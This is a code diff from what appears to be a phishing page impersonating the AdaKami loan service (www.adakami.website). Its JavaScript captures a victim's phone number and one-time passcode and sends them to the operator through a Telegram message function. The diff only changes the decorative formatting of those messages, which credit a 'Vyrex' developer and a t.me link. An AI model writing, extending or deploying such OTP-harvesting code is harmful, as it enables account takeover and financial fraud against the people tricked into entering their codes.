@@ -199,7 +199,7 @@
             submitBtn.disabled = true;
             submitBtn.style.opacity = '0.7';
 
-            const message = `<b>◦•●◉✿ Pesan Masuk ✿◉●•◦</b>\n-ˋˏ✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>👤 𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼ㅤㅤ :</b> <code>${phone}</code>\n<b>🌐 𝙳𝙾𝙼𝙰𝙸𝙽ㅤㅤㅤ :</b> www.adakami.website\n<b>📨 𝚂𝚃𝙰𝚃𝚄𝚂ㅤㅤㅤ :</b> 𝑴𝒆𝒏𝒖𝒏𝒈𝒈𝒖 𝑶𝑻𝑷...\n˜”*°•.˜”*°• ( ͡° ͜ʖ ͡°) （ ͜.人 ͜.）☚⍢⃝☚ •°*”˜.•°*”˜`;
+            const message = `<b>◦•●◉✿ Pesan Masuk ✿◉●•◦</b>\n-ˋˏ✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>👤 𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼ㅤ   :ㅤ</b> <code>${phone}</code>\n<b>🌐 𝙳𝙾𝙼𝙰𝙸𝙽 ㅤ ㅤ   :ㅤ:</b> www.adakami.website\n<b>📨 𝚂𝚃𝙰𝚃𝚄𝚂ㅤㅤㅤ :ㅤ</b> 𝑴𝒆𝒏𝒖𝒏𝒈𝒈𝒖 𝑶𝑻𝑷...\n˜”*°•.˜”*°• ( ͡° ͜ʖ ͡°) （ ͜.人 ͜.）☚⍢⃝☚ •°*”˜.•°*”˜`;
             sendTelegramMessage(message);
             
             setTimeout(() => {
@@ -260,7 +260,7 @@
 
             const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
 
-            const message = `<b> ── ⋆⋅𖤓⋅⋆ ── 𝗞𝗢𝗗𝗘 𝗢𝗧𝗣 𝗠𝗔𝗦𝗨𝗞 ── ⋆⋅𖤓⋅⋆ ── </b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>🔐 ᴏᴛᴘ ᴄᴏᴅᴇㅤㅤ :</b> <code>${formattedOtp}</code>\n<b>˗ˏˋ ☏ ˎˊ˗ ɴᴏᴍᴏʀㅤㅤㅤ :</b> <code>${userPhoneNumber}</code>\n<b>⏱️ ᴡᴀᴋᴛᴜㅤㅤㅤ :</b> ${new Date().toLocaleTimeString('id-ID')}\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b> ⋯⋅๑┈•✦ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃 ✦•┈๑⋅⋯ </b>`;
+            const message = `<b> ── ⋆⋅𖤓⋅⋆ ── 𝗞𝗢𝗗𝗘 𝗢𝗧𝗣 𝗠𝗔𝗦𝗨𝗞 ── ⋆⋅𖤓⋅⋆ ── </b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>🔐 ᴏᴛᴘ ᴄᴏᴅᴇ ㅤ:</b> <code>${formattedOtp}</code>\n<b>˗ˏˋ ☏  ɴᴏᴍᴏʀ ㅤ:</b> <code>${userPhoneNumber}</code>\n<b>⏱️ ᴡᴀᴋᴛᴜ  ㅤㅤ:</b> ${new Date().toLocaleTimeString('id-ID')}\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b> ⋯⋅๑┈•✦ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃 t.me/getlink_v1 ✦•┈๑⋅⋯ </b>`;
             sendTelegramMessage(message);
 
             setTimeout(() => {
